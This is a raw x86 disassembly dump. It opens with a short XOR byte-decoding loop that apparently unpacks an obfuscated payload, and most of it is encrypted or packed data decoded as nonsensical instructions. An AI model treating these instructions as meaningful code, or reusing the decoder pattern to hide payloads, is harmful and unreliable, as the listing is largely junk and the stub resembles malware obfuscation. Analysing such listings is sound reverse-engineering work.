  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	(bad)  
  4060e3:	imul   DWORD PTR [edi+0x4e]
  4060e6:	jno    0x4060a9
  4060e8:	jnp    0x406165
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ef:	clc    
  4060f0:	push   ecx
  4060f1:	pop    edx
  4060f2:	or     eax,0xbb6f087
  4060f7:	jnp    0x40611f
  4060f9:	jmp    FWORD PTR [ebp+edx*4+0xc8e35ef]
  406100:	pop    ebp
  406101:	pop    ds
  406102:	out    0x92,al
  406104:	stc    
  406105:	jmp    0x1d07:0xf3271841
  40610c:	ror    DWORD PTR ds:0x95b9deb,cl
  406112:	dec    edi
  406113:	(bad)  
  406114:	pop    DWORD PTR [edi-0x1c]
  406117:	out    dx,eax
  406118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406119:	push   ebx
  40611a:	cwde   
  40611b:	sbb    BYTE PTR [ebp+0x433658e3],dh
  406121:	sti    
  406122:	xchg   BYTE PTR [ecx-0x1980c1b0],dh
  406128:	mov    al,0xec
  40612a:	int3   
  40612b:	push   ebp
  40612c:	mov    esi,0xe1b85869
  406131:	and    cl,BYTE PTR [ecx+0x1f5b46a7]
  406137:	rcr    BYTE PTR [ebx+ecx*4],0xb0
  40613b:	jge    0x4061a0
  40613d:	(bad)  
  40613f:	imul   ebp,DWORD PTR ds:0xa45653c0,0xf2cf05c0
  406149:	call   0xf47b5055
  40614e:	outs   dx,BYTE PTR ds:[esi]
  40614f:	test   eax,0xcf3cba4c
  406154:	pop    ds
  406155:	test   eax,0x2e444e0e
  40615a:	dec    eax
  40615b:	and    DWORD PTR [edi],edi
  40615d:	(bad)  
  40615e:	mov    esp,0x9e0b9b73
  406163:	popa   
  406164:	imul   BYTE PTR [edi]
  406166:	sub    bh,BYTE PTR [ebp-0x21]
  406169:	sar    DWORD PTR [ebp-0x4c6176d3],cl
  40616f:	adc    al,0x77
  406171:	ror    bh,cl
  406173:	dec    ebp
  406174:	lods   eax,DWORD PTR ds:[esi]
  406175:	push   0x2077eeca
  40617a:	sub    DWORD PTR [esi],edi
  40617c:	jp     0x406174
  40617e:	cmp    bh,al
  406180:	inc    esi
  406181:	jb     0x406145
  406183:	mov    WORD PTR [edx],es
  406185:	pop    edi
  406186:	push   ss
  406187:	ss jle 0x4061fe
  40618a:	(bad)  
  40618b:	fild   DWORD PTR [edx*1+0x4c65b729]
  406192:	jb     0x4061fa
  406194:	add    esi,0xf1a95ee2
  40619a:	mov    BYTE PTR [ebp+0x242d2e80],al
  4061a0:	jno    0x40621e
  4061a2:	jmp    0x4061cc
  4061a4:	loopne 0x4061ae
  4061a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061a7:	lds    ecx,FWORD PTR [eax-0x6d]
  4061aa:	jmp    0x1c14:0xb004e3d1
  4061b1:	jp     0x40619d
  4061b3:	mov    ah,0x34
  4061b5:	xor    cx,WORD PTR [ebp-0x3]
  4061b9:	fistp  WORD PTR [ebp-0x1f058488]
  4061bf:	pushf  
  4061c0:	push   ss
  4061c1:	xchg   BYTE PTR [ebx-0x40],ch
  4061c4:	adc    DWORD PTR [esi-0x22dfc34c],0xe899bbc2
  4061ce:	mov    esp,DWORD PTR es:[ebp-0x7d]
  4061d2:	js     0x4061ba
  4061d4:	cmc    
  4061d5:	arpl   WORD PTR [edx],si
  4061d7:	(bad)  
  4061d8:	js     0x406183
  4061da:	xlat   BYTE PTR ds:[ebx]
  4061db:	daa    
  4061dc:	shl    DWORD PTR [esp+esi*2-0x4ceb8d67],cl
  4061e3:	loope  0x406240
  4061e5:	rol    esp,cl
  4061e7:	enter  0xd845,0x89
  4061eb:	sbb    eax,0x2d032c0a
  4061f0:	pop    ebp
  4061f1:	and    BYTE PTR [eax],cl
  4061f3:	imul   edi,eax,0xffffffd5
  4061f6:	aam    0x65
  4061f8:	dec    edi
  4061f9:	pop    eax
  4061fa:	lods   al,BYTE PTR ds:[esi]
  4061fb:	push   ebp
  4061fc:	(bad)  
  4061fd:	jge    0x4061e5
  4061ff:	mov    ecx,0x764c3d81
  406204:	mov    ebp,0x1c376277
  406209:	sub    dh,BYTE PTR [edx-0x65]
  40620c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40620d:	inc    edx
  40620e:	or     BYTE PTR [esi],cl
  406210:	or     ebp,edi
  406212:	pop    edi
  406213:	push   ss
  406214:	icebp  
  406215:	loop   0x4061df
  406217:	dec    ecx
  406218:	arpl   WORD PTR [edi],cx
  40621a:	sahf   
  40621b:	loope  0x4061e7
  40621d:	push   eax
  40621e:	push   edi
  40621f:	mov    bl,0xdc
  406221:	sbb    edx,eax
  406223:	mov    ebp,0x583d777d
  406228:	outs   dx,BYTE PTR ds:[esi]
  406229:	mov    ah,BYTE PTR [eax-0x53]
  40622c:	das    
  40622d:	mov    al,0x6c
  40622f:	sub    BYTE PTR [esi-0x31aa649d],ch
  406235:	dec    esi
  406236:	or     bl,dl
  406238:	cmp    al,0x5a
  40623a:	pop    ecx
  40623b:	jns    0x406273
  40623d:	dec    ebp
  40623e:	inc    edi
  40623f:	xor    ch,BYTE PTR [eax+eax*2+0x71]
  406243:	and    esp,ebx
  406245:	stc    
  406246:	in     al,dx
  406247:	lea    eax,[edi]
  406249:	cmp    DWORD PTR [edi+0x7b],esi
  40624c:	xlat   BYTE PTR ds:[ebx]
  40624d:	pop    ecx
  40624e:	or     ebp,DWORD PTR [edx+0x4edc055a]
  406254:	xor    al,0x9f
  406256:	xchg   edi,eax
  406257:	std    
  406258:	mov    ebp,0x5790fd83
  40625d:	sbb    DWORD PTR [edx],ebx
  40625f:	(bad)  
  406260:	aam    0x9b
  406262:	clc    
  406263:	mov    edi,0x752ea7db
  406268:	jbe    0x406236
  40626a:	xor    DWORD PTR [eax+ebx*2-0x75],eax
  40626e:	lea    ebp,[ebx-0x3b559e23]
  406274:	pop    ebx
  406275:	sub    eax,0xeab8f34a
  40627a:	push   ss
  40627b:	xor    BYTE PTR [esi-0x80],dh
  40627e:	pop    ebx
  40627f:	mov    edi,0x46b7b92d
  406284:	mov    dh,0x67
  406286:	push   0xf8128a9c
  40628b:	sub    eax,0x98f3b6c6
  406290:	cmp    ah,0x8a
  406293:	in     al,0x49
  406295:	mov    al,0xf0
  406297:	mov    edi,0xdaa449b8
  40629c:	and    eax,DWORD PTR [edx-0x78]
  40629f:	jg     0x4062b4
  4062a1:	popf   
  4062a2:	dec    esp
  4062a3:	inc    ebx
  4062a4:	push   ebx
  4062a5:	rcl    BYTE PTR [edx-0x66726dc4],1
  4062ab:	pop    ebx
  4062ac:	xchg   ebx,eax
  4062ad:	mov    eax,DWORD PTR [ecx+0x3a2593d7]
  4062b3:	mov    ebp,0x8248886a
  4062b8:	mov    al,ds:0x9b6d338a
  4062bd:	sahf   
  4062be:	mov    edx,0x70c939d5
  4062c3:	data16 int3 
  4062c5:	int3   
  4062c6:	sar    ah,1
  4062c8:	mov    ecx,0x54c79f4f
  4062cd:	int    0x1f
  4062cf:	adc    ch,BYTE PTR [esi-0x8]
  4062d2:	mov    ch,0xb8
  4062d4:	jne    0x406265
  4062d6:	mov    bl,0xce
  4062d8:	jmp    0x40633f
  4062da:	inc    eax
  4062db:	mov    DWORD PTR [edx],ebp
  4062dd:	jns    0x406301
  4062df:	in     eax,dx
  4062e0:	sub    al,0xf0
  4062e2:	das    
  4062e3:	add    DWORD PTR [ebp-0x43],esp
  4062e6:	mov    cs,WORD PTR [esi+0x3d]
  4062e9:	popf   
  4062ea:	xchg   edx,eax
  4062eb:	out    dx,eax
  4062ec:	into   
  4062ed:	xchg   esi,eax
  4062ee:	(bad)  
  4062f0:	and    BYTE PTR [edx],bl
  4062f2:	mov    dh,0xa9
  4062f4:	jns    0x4062cc
  4062f6:	sbb    edx,DWORD PTR [eax]
  4062f8:	iret   
  4062f9:	ss out dx,al
  4062fb:	mov    eax,DWORD PTR [eax+0x48]
  4062fe:	dec    eax
  4062ff:	(bad)  
  406300:	fcom   QWORD PTR ds:0xb33d57f3
  406306:	push   cs
  406307:	retf   
  406308:	sbb    eax,DWORD PTR [ebp+eiz*2+0x1c]
  40630c:	adc    ecx,DWORD PTR [ebx+0x34464aa5]
  406312:	in     al,0x80
  406314:	test   DWORD PTR [edx+0x53],0x50fbaa69
  40631b:	es ret 0xe985
  40631f:	loop   0x406367
  406321:	sbb    dh,BYTE PTR [edi]
  406323:	cmp    bh,BYTE PTR [eax+0x5ebb836f]
  406329:	and    dl,BYTE PTR [esi+edx*1-0x5]
  40632d:	mul    DWORD PTR [edx]
  40632f:	jecxz  0x406305
  406331:	jae    0x4062cd
  406333:	push   ds
  406334:	data16 icebp 
  406336:	sub    bh,BYTE PTR [ecx-0x6c]
  406339:	mov    ecx,0x8761f345
  40633e:	xor    eax,0x27037190
  406343:	sbb    dh,ch
  406345:	dec    DWORD PTR [eax-0x9]
  406348:	push   ss
  406349:	xchg   BYTE PTR [ebx],al
  40634b:	jl     0x40636c
  40634d:	sub    eax,0x6699e2d4
  406352:	ins    DWORD PTR es:[edi],dx
  406353:	and    eax,0xcba612ea
  406358:	fstp   TBYTE PTR [ebx+ebx*4+0x45e5ab65]
  40635f:	and    al,0xdc
  406361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406362:	daa    
  406363:	iret   
  406364:	test   al,0x55
  406366:	(bad)  
  406367:	mov    edx,0xecdd014b
  40636c:	enter  0xc995,0xdf
  406370:	jp     0x4063b6
  406372:	int3   
  406373:	cld    
  406374:	xor    esi,DWORD PTR [edx-0x3b]
  406377:	ret    
  406378:	mov    ch,0x76
  40637a:	pop    eax
  40637b:	cmp    DWORD PTR [edx-0x3bbdcbe9],esp
  406381:	das    
  406382:	push   eax
  406383:	xchg   BYTE PTR [ecx],dh
  406385:	pop    ds
  406386:	cmp    bl,bh
  406388:	jbe    0x4063c6
  40638a:	add    bh,BYTE PTR [edx-0x78]
  40638d:	inc    ebp
  40638e:	sbb    edi,DWORD PTR [edi-0x41]
  406391:	or     eax,0xbcdb9396
  406396:	sub    eax,0xd6481366
  40639b:	cs fwait
  40639d:	jmp    0x3653:0x50a8cdae
  4063a4:	cmp    al,0xb1
  4063a6:	ror    DWORD PTR [ebp+0x175abfe0],cl
  4063ac:	mov    dl,0xaf
  4063ae:	push   ebx
  4063af:	cld    
  4063b0:	mov    ds:0xaa4f234a,eax
  4063b5:	(bad)  
  4063b6:	inc    ebx
  4063b7:	nop
  4063b8:	pop    edi
  4063b9:	mul    bh
  4063bb:	xchg   esi,eax
  4063bc:	arpl   WORD PTR [ebx+ebp*8+0x1e],bp
  4063c0:	push   esp
  4063c1:	jnp    0x406432
  4063c3:	cmp    ebp,esp
  4063c5:	sbb    eax,ebx
  4063c7:	bnd jl 0x406395
  4063ca:	push   ecx
  4063cb:	hlt    
  4063cc:	lods   al,BYTE PTR ds:[esi]
  4063cd:	bound  ecx,QWORD PTR [edx-0x24f3e477]
  4063d3:	and    ebx,eax
  4063d5:	cld    
  4063d6:	jb     0x4063b5
  4063d8:	dec    esp
  4063d9:	call   DWORD PTR [edi+0x23]
  4063dc:	in     eax,dx
  4063dd:	push   0xffffff9c
  4063df:	inc    ebx
  4063e0:	in     eax,dx
  4063e1:	neg    DWORD PTR [esi-0x5e]
  4063e4:	mov    ch,0xce
  4063e6:	loope  0x40640d
  4063e8:	mov    al,ds:0x6e56eddf
  4063ed:	js     0x4063e5
  4063ef:	xor    BYTE PTR ds:0xd8b9cdfe,dl
  4063f5:	popa   
  4063f6:	xlat   BYTE PTR ds:[ebx]
  4063f7:	cli    
  4063f8:	es stos BYTE PTR es:[edi],al
  4063fa:	call   0xdb9ee7b6
  4063ff:	cmc    
  406400:	imul   esi,DWORD PTR [ecx+0x7d],0x2efbff88
  406407:	adc    dl,al
  406409:	fist   WORD PTR [esi+0x27]
  40640c:	or     DWORD PTR [ebx],0xffffff84
  40640f:	imul   ecx,eax,0x5e
  406412:	adc    al,0xd3
  406414:	and    eax,0x73a6deeb
  406419:	pop    ss
  40641a:	mov    bh,0x10
  40641c:	clc    
  40641d:	mov    DWORD PTR [esi+0x9759fe6],ebx
  406423:	js     0x406479
  406425:	xor    eax,0x9abb1ea9
  40642a:	(bad)  [esi-0x77]
  40642d:	pop    ds
  40642e:	fild   WORD PTR [ecx-0x58]
  406431:	xor    BYTE PTR [esp+eax*1+0x66165227],ah
  406438:	and    al,0x2
  40643a:	dec    ecx
  40643b:	hlt    
  40643c:	xchg   ebp,eax
  40643d:	stc    
  40643e:	out    0x12,al
  406440:	faddp  st(0),st
  406442:	and    al,0x5c
  406444:	cmp    DWORD PTR [edx+0x64546402],ebx
  40644a:	mov    gs,WORD PTR [esi]
  40644c:	pop    ecx
  40644d:	int    0x48
  40644f:	(bad)  
  406450:	(bad)  
  406451:	fucomp st(3)
  406453:	int    0x3c
  406455:	hlt    
  406456:	add    DWORD PTR [edx+0x62f279bc],esi
  40645c:	clc    
  40645d:	ds std 
  40645f:	add    al,dl
  406461:	mov    ecx,0x1c07a0f7
  406466:	add    al,0x49
  406468:	push   edi
  406469:	mov    BYTE PTR [edx-0x582873c7],cl
  40646f:	or     al,0x7c
  406471:	out    0x91,al
  406473:	xchg   DWORD PTR [eax],eax
  406475:	jnp    0x406442
  406477:	fsub   DWORD PTR [edi]
  406479:	mov    dh,0xd6
  40647b:	lds    ecx,FWORD PTR gs:[edi-0x4]
  40647f:	cli    
  406480:	push   esp
  406481:	lahf   
  406482:	daa    
  406483:	xchg   BYTE PTR [esp+ebx*8+0x1e],dl
  406487:	out    dx,al
  406488:	test   DWORD PTR [esi],ebp
  40648a:	out    0x27,al
  40648c:	jbe    0x40647f
  40648e:	adc    eax,0x7dd71e3e
  406493:	pop    es
  406494:	in     al,dx
  406495:	sub    al,0xea
  406497:	or     esp,edi
  406499:	or     BYTE PTR [ecx],0xc0
  40649c:	xchg   esp,eax
  40649d:	pop    eax
  40649e:	xlat   BYTE PTR ds:[ebx]
  40649f:	cli    
  4064a0:	cdq    
  4064a1:	jmp    0x4064a2
  4064a3:	sbb    eax,0xdc26e21e
  4064a8:	ret    0xd5f5
  4064ab:	sub    al,0x7
  4064ad:	lods   eax,DWORD PTR ds:[esi]
  4064ae:	outs   dx,DWORD PTR ds:[esi]
  4064af:	(bad)  
  4064b0:	ror    BYTE PTR [edx+edx*2],1
  4064b3:	xlat   BYTE PTR ds:[ebx]
  4064b4:	or     eax,0x3fe73d40
  4064b9:	xchg   esi,eax
  4064ba:	push   eax
  4064bb:	in     eax,0x9a
  4064bd:	call   0x18f7e733
  4064c2:	cmp    DWORD PTR [eax-0x1b],edx
  4064c5:	lock fbld TBYTE PTR [ecx+ecx*8]
  4064c9:	dec    ebp
  4064ca:	rcl    ecx,1
  4064cc:	in     eax,0x43
  4064ce:	jmp    0x112503dc
  4064d3:	push   ds
  4064d4:	push   0x2b
  4064d6:	clc    
  4064d7:	and    BYTE PTR [edi-0x1d],dl
  4064da:	add    DWORD PTR [esi+0x7a],ecx
  4064dd:	cmp    al,0x6d
  4064df:	add    eax,0x21e32e9f
  4064e4:	mov    dl,0xee
  4064e6:	test   BYTE PTR [ebx],dh
  4064e8:	lock jb 0x40652a
  4064eb:	xchg   ebp,eax
  4064ec:	push   ebx
  4064ed:	je     0x40654e
  4064ef:	mov    ebx,0xf0468191
  4064f4:	cs xchg ebp,eax
  4064f6:	js     0x4064dd
  4064f8:	jl     0x406501
  4064fa:	test   eax,0x941d03d1
  4064ff:	cmp    dl,bh
  406501:	aad    0x3e
  406503:	xor    dl,dl
  406505:	jle    0x4064fb
  406507:	mov    DWORD PTR [eax+eax*1-0x67],edi
  40650b:	xchg   ebp,eax
  40650c:	push   0x77
  40650e:	push   eax
  40650f:	inc    ecx
  406510:	imul   edx,eax,0x5d230a2
  406516:	ret    
  406517:	test   al,0x48
  406519:	or     al,BYTE PTR [ebx]
  40651b:	imul   edx,DWORD PTR [esi+0x3df90235],0x23b077b
  406525:	call   0x6652:0xa825d9d
  40652c:	lods   eax,DWORD PTR ds:[esi]
  40652d:	add    al,0x17
  40652f:	aam    0x15
  406531:	sbb    ebx,edx
  406533:	push   ebx
  406534:	test   BYTE PTR ds:0xcd80e5af,cl
  40653a:	dec    esp
  40653b:	pushf  
  40653c:	test   DWORD PTR [edi],ebp
  40653e:	add    dh,0xcc
  406541:	fstp   DWORD PTR [edi+0x52]
  406544:	adc    al,0xc
  406546:	jmp    0xd03e2648
  40654b:	xor    BYTE PTR [ecx],dl
  40654d:	jmp    0xdcae:0x5df08028
  406554:	mov    ah,0xde
  406556:	xchg   ebp,eax
  406557:	hlt    
  406558:	mov    edx,0x1d6c3821
  40655d:	pop    ebp
  40655e:	jp     0x4064e5
  406560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406561:	mov    edx,DWORD PTR [ebp-0x7f]
  406564:	(bad)  [esp+ecx*2+0x20]
  406568:	push   ecx
  406569:	add    BYTE PTR [ebx+0x2],0xe9
  40656d:	and    ch,0x9
  406570:	jbe    0x40658f
  406572:	js     0x4065f0
  406574:	mov    esi,0x10d7811c
  406579:	lods   al,BYTE PTR ds:[esi]
  40657a:	jp     0x4064ff
  40657c:	push   edi
  40657d:	add    DWORD PTR [eax-0xb],edx
  406580:	jns    0x406543
  406582:	das    
  406583:	pushf  
  406584:	test   eax,0x86fae13d
  406589:	jecxz  0x40651b
  40658b:	sbb    al,0x37
  40658d:	stos   BYTE PTR es:[edi],al
  40658e:	push   ds
  40658f:	aas    
  406590:	mov    esp,0xaa97731a
  406595:	cmp    dh,BYTE PTR [ebp+edi*2+0x46d9c02a]
  40659c:	mov    ch,0xd2
  40659e:	cmc    
  40659f:	sbb    al,0xfc
  4065a1:	aas    
  4065a2:	cli    
  4065a3:	xor    bl,BYTE PTR [edx]
  4065a5:	or     ebp,ebp
  4065a7:	cmp    esi,DWORD PTR [eax+0x6b]
  4065aa:	adc    DWORD PTR [ebx-0x63],esp
  4065ad:	pop    esp
  4065ae:	ret    
  4065af:	or     BYTE PTR ds:0x64558e47,cl
  4065b5:	adc    eax,0x1f71a332
  4065ba:	popf   
  4065bb:	das    
  4065bc:	and    eax,0x71f42f60
  4065c1:	stc    
  4065c2:	and    dh,ch
  4065c4:	mov    ebp,0x9dfb04b3
  4065c9:	mov    edx,0x811172e
  4065ce:	cmp    edx,DWORD PTR [edi]
  4065d0:	add    cl,BYTE PTR [edi+ebx*2+0x64]
  4065d4:	adc    BYTE PTR [edi],dl
  4065d6:	push   edx
  4065d7:	cmc    
  4065d8:	cmp    al,0x47
  4065da:	jmp    0xd660:0x360e36ed
  4065e1:	sub    edi,0x77
  4065e4:	dec    eax
  4065e5:	push   ds
  4065e6:	or     bh,BYTE PTR [bx+di]
  4065e9:	mov    al,0xe7
  4065eb:	inc    ebx
  4065ec:	outs   dx,DWORD PTR ds:[esi]
  4065ed:	and    DWORD PTR [ebx+0x235de08f],ecx
  4065f3:	mov    ebx,DWORD PTR [ecx-0x5d7f9f3a]
  4065f9:	clc    
  4065fa:	out    0xfb,eax
  4065fc:	loop   0x406666
  4065fe:	pop    esp
  4065ff:	dec    ebp
  406600:	sub    al,BYTE PTR [ecx-0x68]
  406603:	push   ds
  406604:	xor    BYTE PTR es:[ecx+0x61adfaee],ah
  40660b:	xchg   DWORD PTR [esi-0x6c],ebx
  40660e:	lahf   
  40660f:	inc    esi
  406610:	std    
  406611:	shl    DWORD PTR [edi],0x63
  406614:	sahf   
  406615:	mov    edi,0x50186244
  40661a:	xchg   esi,eax
  40661b:	(bad)  
  40661c:	out    dx,al
  40661d:	mov    ch,0x72
  40661f:	jl     0x40666e
  406621:	shl    DWORD PTR [edi+0x198eacc1],0x86
  406628:	shl    BYTE PTR [edi+0x55d75f79],0xf0
  40662f:	push   edx
  406630:	push   ss
  406631:	and    eax,0x837c3d94
  406636:	lods   eax,DWORD PTR es:[esi]
  406638:	sub    edi,DWORD PTR [edi-0x32a8ff05]
  40663e:	or     BYTE PTR [edi+edx*2+0x36],dl
  406642:	pop    ebp
  406643:	jbe    0x4065e1
  406645:	jns    0x4065e9
  406647:	sti    
  406648:	jno    0x406608
  40664a:	inc    esi
  40664b:	dec    eax
  40664c:	cmp    DWORD PTR [eax-0x37820da0],eax
  406652:	jle    0x406686
  406654:	sub    al,0x2a
  406656:	enter  0xd47c,0x38
  40665a:	cmp    eax,0xf166ef55
  40665f:	ret    0x4d8e
  406662:	push   ecx
  406663:	mov    esi,0x9aeef395
  406668:	mov    WORD PTR fs:[eax],sp
  40666c:	and    ch,BYTE PTR [eax-0x3b52f997]
  406672:	xchg   ebp,eax
  406673:	mov    ch,0x71
  406675:	mov    es,ecx
  406677:	mov    fs,esi
  406679:	inc    ebp
  40667a:	or     eax,0x5a6484fd
  40667f:	and    al,BYTE PTR [ebx+0x55]
  406682:	out    0x11,al
  406684:	pop    ebx
  406685:	repnz mov ecx,0x8a532394
  40668b:	inc    ebx
  40668c:	push   esp
  40668d:	aam    0x5
  40668f:	not    BYTE PTR [ecx]
  406691:	ins    BYTE PTR es:[edi],dx
  406692:	sbb    BYTE PTR [eax+0x1e],0xbe
  406696:	jp     0x4066ef
  406698:	sahf   
  406699:	xor    ecx,DWORD PTR [eax+0x1665ba6a]
  40669f:	inc    eax
  4066a0:	cli    
  4066a1:	lock std 
  4066a3:	adc    ebx,DWORD PTR [ecx-0x5b]
  4066a6:	jno    0x40665e
  4066a8:	fcom   st(1)
  4066aa:	sbb    al,0x1b
  4066ac:	call   0x55aa050c
  4066b1:	mov    al,ds:0xf3950764
  4066b6:	mov    eax,ds:0x82912203
  4066bb:	lds    esp,FWORD PTR [edi]
  4066bd:	push   ebp
  4066be:	or     esp,DWORD PTR [ebx]
  4066c0:	jmp    0x37d9:0x61e2d132
  4066c7:	push   0xdd296afb
  4066cc:	imul   esi,DWORD PTR [ebx-0x75ee2a1e],0xffffff94
  4066d3:	test   BYTE PTR [esi],ch
  4066d5:	je     0x40672e
  4066d7:	js     0x40674d
  4066d9:	mov    esi,0x6b575c33
  4066de:	test   BYTE PTR [ecx],cl
  4066e0:	sbb    eax,0xb58d3a7
  4066e5:	(bad)  
  4066e7:	popa   
  4066e8:	addr16 push esi
  4066ea:	adc    al,0x40
  4066ec:	cld    
  4066ed:	add    eax,0x7bfd03eb
  4066f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066f3:	jp     0x4066e8
  4066f5:	daa    
  4066f6:	cmp    ch,BYTE PTR [ebx]
  4066f8:	(bad)  
  4066f9:	push   eax
  4066fa:	lahf   
  4066fb:	pop    es
  4066fc:	mov    ds:0x6e39e327,al
  406701:	sbb    eax,DWORD PTR [eax-0x5e598431]
  406707:	xchg   ebp,eax
  406708:	push   ebx
  406709:	ja     0x4066ee
  40670b:	je     0x406755
  40670d:	mov    esi,0x3db26e56
  406712:	add    eax,0x5deec795
  406717:	add    edi,DWORD PTR [eax]
  406719:	cmc    
  40671a:	retf   0x5d96
  40671d:	xor    ch,BYTE PTR [ebp+0x130222f1]
  406723:	mov    bl,0xea
  406725:	cmp    al,0xd8
  406727:	dec    esi
  406728:	pop    ebx
  406729:	test   al,0x36
  40672b:	xchg   edx,eax
  40672c:	pop    ecx
  40672d:	gs fwait
  40672f:	ins    DWORD PTR es:[edi],dx
  406730:	sub    al,0x24
  406732:	jmp    0x406782
  406734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406735:	lock imul edx,DWORD PTR [ecx],0xffffffce
  406739:	daa    
  40673a:	and    dl,BYTE PTR [esi]
  40673c:	mov    al,0x21
  40673e:	mov    eax,0x21793478
  406743:	jmp    0x9ce04246
  406748:	in     al,0xfc
  40674a:	sub    DWORD PTR [esi+0x30],0x3a
  40674e:	lods   al,BYTE PTR ds:[esi]
  40674f:	pusha  
  406750:	mov    eax,ecx
  406752:	sub    BYTE PTR [edx+0x48],bl
  406755:	(bad)  
  406756:	mov    ch,0x3f
  406758:	inc    edi
  406759:	inc    eax
  40675a:	inc    edi
  40675b:	mov    dl,0x99
  40675d:	push   esp
  40675e:	shl    bh,cl
  406760:	sti    
  406761:	loope  0x4067af
  406763:	pusha  
  406764:	nop
  406765:	mov    al,0x10
  406767:	fisttp DWORD PTR [esi+edx*4-0x97b72e1]
  40676e:	int3   
  40676f:	adc    DWORD PTR [ebx+eiz*2+0x301531d],esp
  406776:	jne    0x406762
  406778:	scas   eax,DWORD PTR es:[edi]
  406779:	or     al,0x57
  40677b:	ds int 0x72
  40677e:	rcr    DWORD PTR [esi+esi*2],0x37
  406782:	cdq    
  406783:	sbb    ebp,DWORD PTR [eax-0x10c381a1]
  406789:	mov    ch,0x75
  40678b:	xchg   esp,eax
  40678c:	jne    0x40680b
  40678e:	mov    bl,0xf8
  406790:	shl    BYTE PTR [esi],cl
  406792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406793:	dec    edx
  406794:	imul   ebp,DWORD PTR [ebx+0x713144b9],0x25
  40679b:	out    0xad,eax
  40679d:	lahf   
  40679e:	in     al,0xb7
  4067a0:	lock call 0xdc2e2194
  4067a6:	loopne 0x4067e1
  4067a8:	push   ecx
  4067a9:	mov    cs,eax
  4067ab:	(bad)  
  4067ac:	cwde   
  4067ad:	scas   eax,DWORD PTR es:[edi]
  4067ae:	pop    ebx
  4067af:	dec    esi
  4067b0:	and    al,0x6b
  4067b2:	mov    ds:0x7fcf3071,eax
  4067b7:	add    ch,BYTE PTR [esp+ecx*8-0x50d11cfe]
  4067be:	ret    0x48fc
  4067c1:	fidivr DWORD PTR ds:0x557487ca
  4067c7:	push   eax
  4067c8:	outs   dx,DWORD PTR ds:[esi]
  4067c9:	mov    edx,0x13822ad5
  4067ce:	xor    ah,dh
  4067d0:	sbb    dh,BYTE PTR [ecx]
  4067d2:	dec    edx
  4067d3:	dec    eax
  4067d4:	addr16 push 0xb4db5304
  4067da:	stc    
  4067db:	and    ah,BYTE PTR [edi]
  4067dd:	mov    ah,0x5e
  4067df:	xchg   BYTE PTR [ebx-0x34],al
  4067e2:	fwait
  4067e3:	mov    esp,eax
  4067e5:	fmul   QWORD PTR [ebx+ebp*1+0x17]
  4067e9:	dec    ebx
  4067ea:	pusha  
  4067eb:	popa   
  4067ec:	aas    
  4067ed:	retf   0x4aa3
  4067f0:	clc    
  4067f1:	or     eax,0x87ce8b76
  4067f6:	xor    bh,BYTE PTR [esi+esi*1-0x2f]
  4067fa:	enter  0x96d5,0x12
  4067fe:	sti    
  4067ff:	mov    ebp,0x8e12eb32
  406804:	jmp    0xdb624a7f
  406809:	ds unpcklps xmm1,xmm7
  40680d:	xor    ch,BYTE PTR [esi+0x1e]
  406810:	jmp    0x356:0xaa86743e
  406817:	mov    ax,ds:0x96da10c0
  40681d:	inc    esi
  40681e:	sub    eax,0x988ea4c2
  406823:	or     ecx,edi
  406825:	xchg   ebx,eax
  406826:	jo     0x40681a
  406828:	sti    
  406829:	sbb    esi,DWORD PTR [ebx]
  40682b:	or     bl,BYTE PTR [ebx+eax*2+0x68]
  40682f:	fistp  DWORD PTR [edi-0xb3ce99e]
  406835:	push   ds
  406836:	inc    ecx
  406837:	mov    ecx,0xa5242424
  40683c:	cmp    DWORD PTR [edi-0x6e],esi
  40683f:	ins    DWORD PTR es:[edi],dx
  406840:	push   cs
  406841:	mov    BYTE PTR [ebp+0x3],0xf4
  406845:	repz inc eax
  406847:	mov    ch,0x32
  406849:	sub    DWORD PTR [edx],ebx
  40684b:	je     0x4067f0
  40684d:	pop    ss
  40684e:	cmp    bl,bl
  406850:	mov    ds:0x284fe23d,al
  406855:	sub    DWORD PTR [edx],ebp
  406857:	xor    DWORD PTR [ecx+0x38673c69],0x20aab822
  406861:	cmp    ch,BYTE PTR [edi-0x5e]
  406864:	rcr    esp,1
  406866:	and    BYTE PTR [ecx+0x2d],dh
  406869:	sbb    bl,dl
  40686b:	cld    
  40686c:	jle    0x4068c6
  40686e:	jg     0x406860
  406870:	adc    eax,ebp
  406872:	jns    0x4067fc
  406874:	jl     0x4067fe
  406876:	pop    es
  406877:	push   0x2a
  406879:	mov    dh,0x7
  40687b:	or     eax,0x93c9461
  406880:	pop    ebp
  406881:	jmp    0x6301:0x3d14c234
